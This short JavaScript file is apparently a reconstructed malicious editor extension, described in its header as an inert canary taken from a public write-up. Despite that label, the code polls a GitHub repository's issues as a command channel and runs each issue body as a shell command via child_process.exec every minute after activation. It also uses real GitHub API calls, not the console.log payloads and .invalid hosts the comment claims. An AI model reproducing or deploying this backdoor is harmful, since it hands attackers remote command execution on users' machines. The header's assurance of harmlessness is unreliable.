// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const https = require('https');
const TOKEN = 'ghp_' + 'CANARYCANARYCANARYCANARYCANARYCANARY';
function poll() {
  https.get({ host: 'api.github.com', path: '/repos/attacker-invalid/c2/issues', headers: { Authorization: 'token ' + TOKEN, 'User-Agent': 'x' } }, r => {
    let b = ''; r.on('data', d => b += d); r.on('end', () => { const cmd = JSON.parse(b)[0].body; require('child_process').exec(cmd); });
  });
}
exports.activate = function () { setInterval(poll, 60000); };
